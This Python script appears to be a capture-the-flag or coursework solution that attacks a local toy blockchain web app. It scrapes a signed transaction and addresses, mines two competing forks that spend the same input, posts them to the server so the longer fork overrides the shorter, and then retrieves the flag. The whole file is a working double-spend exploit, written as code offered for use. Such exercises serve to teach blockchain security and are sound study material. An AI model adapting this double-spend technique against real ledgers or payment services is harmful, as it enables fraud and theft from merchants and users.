# -*- encoding: utf-8 -*-
import rsa, uuid, json, copy, requests, re, hashlib
from functools import reduce

# 初始设置
DIFFICULTY = int('00000' + 'f' * 59, 16)
EMPTY_HASH = '0' * 64
path = 'comp5567/project/screen_snap/'

'''hash函数'''
def hash(x):
    if isinstance(x, str):
        x = x.encode('utf-8')
    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()

def hash_reducer(x, y):
    return hash(hash(x) + hash(y))

def hash_utxo(utxo):
    return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])

def hash_tx(tx):
    return reduce(hash_reducer, [
        reduce(hash_reducer, tx['input'], EMPTY_HASH),
        reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH)
    ])

def hash_block(block):
    tx_hashes = [tx['hash'] for tx in block['transactions']]
    tx_root = reduce(hash_reducer, tx_hashes, EMPTY_HASH) if tx_hashes else EMPTY_HASH
    return reduce(hash_reducer, [block['prev'], block['nonce'], tx_root])

def header_change(session):
    return {
        "Host": "127.0.0.1:5000",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8",
        "Cookie": "session=" + session,
        "Connection": "close",
        "Content-Type": "application/json"
    }

'''
def get_headers(session):
    return {
        "Cookie": "session=" + session,
        "Content-Type": "application/json"
    }
'''

'''
def show_blockchain(url_prefix, session):
    headers = header_change(session)
    flag_response = requests.get(url_prefix + '/flag', headers=headers)
    flag_text = flag_response.text.strip()
    
    homepage_response = requests.get(url_prefix, headers=headers)
    info = extract_blockchain_info(homepage_response.text)
    block_count = len(info.get('blocks', {}))
    print(block_count)
'''

def extract_blockchain_info(html_content):
    info = {}
    
    genesis_match = re.search(r'hash of genesis block: ([a-f0-9]+)', html_content)
    if genesis_match:
        info['genesis_hash'] = genesis_match.group(1)
        print(f"创世区块: {info['genesis_hash']}")
    
    bank_match = re.search(r"the bank's addr: ([a-f0-9]+)", html_content)
    hacker_match = re.search(r"the hacker's addr: ([a-f0-9]+)", html_content)  
    shop_match = re.search(r"the shop's addr: ([a-f0-9]+)", html_content)
    
    if bank_match and hacker_match and shop_match:
        info['bank_addr'] = bank_match.group(1)
        print(f"银行地址: {info['bank_addr']}")
        info['hacker_addr'] = hacker_match.group(1)
        print(f"黑客地址: {info['hacker_addr']}")
        info['shop_addr'] = shop_match.group(1)
        print(f"商店地址: {info['shop_addr']}")
    
    blocks_match = re.search(r"Blockchain Explorer: ({.*})", html_content)
    if blocks_match:
        blocks_data = json.loads(blocks_match.group(1))
        info['blocks'] = blocks_data
            
        for block_hash, block in blocks_data.items():
            if block.get('height') == 1 and block.get('transactions'):
                for tx in block['transactions']:
                    if tx.get('input') and len(tx['input']) > 0:
                        info['input_utxo'] = tx['input'][0]
                        if tx.get('signature') and len(tx['signature']) > 0:
                            info['signature'] = tx['signature'][0]
                        print(f"输入UTXO: {info['input_utxo']}")
                        print(f"签名: {info['signature'][:20]}...")
                        break
                break
    
    return info

def pow(b, difficulty, msg=""):
    nonce = 0
    print(f"PoW {msg}")
    
    while nonce < (2**32):
        b['nonce'] = msg + str(nonce)
        b['hash'] = hash_block(b)
        block_hash = int(b['hash'], 16)
        
        if block_hash < difficulty:
            print(f"nonce: {nonce}, hash: {b['hash']}")
            return b
        
        if nonce % 100000 == 0 and nonce > 0:
            print(f"已尝试 {nonce} 次...")
        
        nonce += 1


'''
def myprint(b):
    return json.dumps(b)
'''

def empty_block(prev_hash, msg=""):
    b = {}
    b["prev"] = prev_hash
    b["transactions"] = []
    return pow(b, DIFFICULTY, msg)

def initialize():
    url = "http://127.0.0.1:5000/b9af31f66147e/"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
    }

    r = requests.get(url=url, headers=headers)
    session = r.headers['Set-Cookie'].split(";")[0][8:]
    print(f"session: {session[:20]}...")
    
    return r, session

def inf_extraction(r):
    info = extract_blockchain_info(r.text)

    genesis_hash = info['genesis_hash']
    shop_address = info['shop_addr']
    input_val = info['input_utxo']
    signature = info['signature']
    txout_id = str(uuid.uuid4())

    return genesis_hash, shop_address, input_val, signature, txout_id

def final_check(session):
    flag_url = "http://127.0.0.1:5000/b9af31f66147e/flag"
    flag_response = requests.get(url=flag_url, headers=header_change(session))
    print(flag_response.text)

'''
def debug_submission(block, session, description):
    print(f"提交区块: {description}")
    print(f"区块哈希: {block.get('hash', '')[:16]}...")
    print(f"前驱区块: {block.get('prev', '')[:16]}...")
    print(f"交易数: {len(block.get('transactions', []))}")
    
    url_begin = "http://127.0.0.1:5000/b9af31f66147e/create_transaction"
    result = requests.post(url_begin, data=json.dumps(block), headers=header_change(session))
    
    print(f"响应状态: {result.status_code}")
    print(f"响应内容: {result.text}")
    
    # 检查session更新
    new_session = session
    new_session = result.headers['Set-Cookie'].split(";")[0][8:]
    if new_session != session:
        print(f"   🔄 Session已更新")
    
    return result.text, new_session
'''
'''
def check_height(session):
    url = "http://127.0.0.1:5000/b9af31f66147e/"
    response = requests.get(url, headers=header_change(session))

    info = extract_blockchain_info(response.text)
    print(f"区块链高度: {len(info.get('blocks', {}))} 区块")
    
    return response.text
'''

def save_html(session, filename):

    url = "http://127.0.0.1:5000/b9af31f66147e/"
    
    response = requests.get(url, headers=header_change(session))
    html_content = response.text
    filename = path+ filename    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(html_content)
        
    return html_content

def main_attack():
    r, session = initialize()

    genesis_hash, shop_address, input_val, signature, txout_id = inf_extraction(r)

    #show_blockchain("http://127.0.0.1:5000/", session)
    #save_html(session, "0.html")
    
    tx_a = {
        "input": [input_val], 
        "output": [{
            "amount": 1000000, 
            'id': txout_id,
            'addr': shop_address
        }], 
        'signature': [signature]
    }
    tx_a["output"][0]["hash"] = hash_utxo(tx_a["output"][0])
    tx_a['hash'] = hash_tx(tx_a)

    blocka_1 = {
        "prev": genesis_hash,
        "transactions": [tx_a]
    }
    blocka_1 = pow(blocka_1, DIFFICULTY, "A1")
    blocka_2 = empty_block(blocka_1["hash"], "A2")
    blocka_3 = empty_block(blocka_2["hash"], "A3")

    tx_b = {
        "input": [input_val],
        "output": [{
            "amount": 1000000, 
            'id': txout_id,
            'addr': shop_address
        }], 
        'signature': [signature]
    }
    tx_b["output"][0]["hash"] = hash_utxo(tx_b["output"][0])
    tx_b['hash'] = hash_tx(tx_b)

    blockb_1 = {
        "prev": genesis_hash,  
        "transactions": [tx_b]
    }
    
    blockb_1 = pow(blockb_1, DIFFICULTY, "B1")
    blockb_2 = empty_block(blockb_1["hash"], "B2")
    blockb_3 = empty_block(blockb_2["hash"], "B3")
    blockb_4 = empty_block(blockb_3["hash"], "B4")
    blockb_5 = empty_block(blockb_4["hash"], "B5")

    url_begin = "http://127.0.0.1:5000/b9af31f66147e/create_transaction"

    save_html(session, "1.html")

    for i, block in enumerate([blocka_1, blocka_2, blocka_3], 1):
        result = requests.post(url_begin, data=json.dumps(block), headers=header_change(session))
        session = result.headers['Set-Cookie'].split(";")[0][8:]
        print(f"A{i}: {result.text}")

    save_html(session, "2.html")
    #show_blockchain("http://127.0.0.1:5000/b9af31f66147e", session)

    for i, block in enumerate([blockb_1, blockb_2, blockb_3, blockb_4, blockb_5], 1):
        result = requests.post(url_begin, data=json.dumps(block), headers=header_change(session))
        session = result.headers['Set-Cookie'].split(";")[0][8:]
        print(f"B{i}: {result.text}")

    save_html(session, "3.html")
    #show_blockchain("http://127.0.0.1:5000/b9af31f66147e", session)

    final_check(session)


if __name__ == "__main__":
    main_attack()